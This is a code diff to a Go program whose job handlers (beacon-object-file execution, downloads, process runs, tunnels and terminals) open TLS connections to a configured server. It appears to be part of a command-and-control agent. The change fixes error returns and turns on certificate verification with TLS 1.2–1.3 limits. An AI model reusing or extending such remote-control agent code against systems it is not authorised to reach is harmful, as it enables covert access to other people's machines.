@@ -649,16 +649,20 @@ func jobExecBofAsync(paramsData []byte) ([]byte, error) {
 	if profile.UseSSL {
 		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 		if certerr != nil {
-			return nil, err
+			return nil, certerr
 		}
 
 		caCertPool := x509.NewCertPool()
 		caCertPool.AppendCertsFromPEM(profile.CaCert)
 
+		host, _, _ := net.SplitHostPort(profile.Addresses[0])
 		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
+			Certificates:     []tls.Certificate{cert},
+			RootCAs:          caCertPool,
+			ServerName:       host,
+			MinVersion:       tls.VersionTLS12,
+			MaxVersion:       tls.VersionTLS13,
+			CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
 		}
 		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
@@ -875,16 +879,20 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 	if profile.UseSSL {
 		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 		if certerr != nil {
-			return nil, err
+			return nil, certerr
 		}
 
 		caCertPool := x509.NewCertPool()
 		caCertPool.AppendCertsFromPEM(profile.CaCert)
 
+		host, _, _ := net.SplitHostPort(profile.Addresses[0])
 		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
+			Certificates:     []tls.Certificate{cert},
+			RootCAs:          caCertPool,
+			ServerName:       host,
+			MinVersion:       tls.VersionTLS12,
+			MaxVersion:       tls.VersionTLS13,
+			CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
 		}
 		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
@@ -1016,16 +1024,20 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 		if certerr != nil {
 			procCancel()
-			return nil, err
+			return nil, certerr
 		}
 
 		caCertPool := x509.NewCertPool()
 		caCertPool.AppendCertsFromPEM(profile.CaCert)
 
+		host, _, _ := net.SplitHostPort(profile.Addresses[0])
 		config := &tls.Config{
-			Certificates:       []tls.Certificate{cert},
-			RootCAs:            caCertPool,
-			InsecureSkipVerify: true,
+			Certificates:     []tls.Certificate{cert},
+			RootCAs:          caCertPool,
+			ServerName:       host,
+			MinVersion:       tls.VersionTLS12,
+			MaxVersion:       tls.VersionTLS13,
+			CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
 		}
 		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
@@ -1299,10 +1311,14 @@ func jobTunnel(paramsData []byte) {
 			caCertPool := x509.NewCertPool()
 			caCertPool.AppendCertsFromPEM(profile.CaCert)
 
+			host, _, _ := net.SplitHostPort(profile.Addresses[0])
 			config := &tls.Config{
-				Certificates:       []tls.Certificate{cert},
-				RootCAs:            caCertPool,
-				InsecureSkipVerify: true,
+				Certificates:     []tls.Certificate{cert},
+				RootCAs:          caCertPool,
+				ServerName:       host,
+				MinVersion:       tls.VersionTLS12,
+				MaxVersion:       tls.VersionTLS13,
+				CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
 			}
 			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
@@ -1444,10 +1460,14 @@ func jobTerminal(paramsData []byte) {
 			caCertPool := x509.NewCertPool()
 			caCertPool.AppendCertsFromPEM(profile.CaCert)
 
+			host, _, _ := net.SplitHostPort(profile.Addresses[0])
 			config := &tls.Config{
-				Certificates:       []tls.Certificate{cert},
-				RootCAs:            caCertPool,
-				InsecureSkipVerify: true,
+				Certificates:     []tls.Certificate{cert},
+				RootCAs:          caCertPool,
+				ServerName:       host,
+				MinVersion:       tls.VersionTLS12,
+				MaxVersion:       tls.VersionTLS13,
+				CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
 			}
 			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
 
